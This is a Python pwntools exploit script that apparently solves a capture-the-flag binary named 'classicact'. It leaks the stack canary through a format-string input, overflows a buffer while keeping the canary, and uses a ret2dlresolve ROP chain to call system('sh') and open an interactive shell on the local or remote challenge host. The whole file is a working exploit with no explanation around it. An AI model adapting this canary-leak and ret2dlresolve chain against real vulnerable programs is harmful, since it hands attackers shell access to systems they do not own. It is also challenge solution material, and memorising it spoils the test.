#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./classicact',checksec=False)

dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop = ROP(binary)
ret = rop.find_gadget(['ret'])[0]
rop.raw(ret)
rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

if args.REMOTE:
	p = remote('0.cloud.chals.io', 10058)
else:
	p = process(binary.path)

p.sendlineafter(b'name!\n',b'%19$p')
p.recvline()
canary = int(p.recvline().strip().decode(),16)
log.info('canary: {x}'.format(x = hex(canary)))

payload  = b''
payload += (0x58 - 0x10) * b'A'
payload += p64(canary)
payload += (0x58 - len(payload)) * b'B'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendlineafter(b'today?\n',payload)
p.interactive()
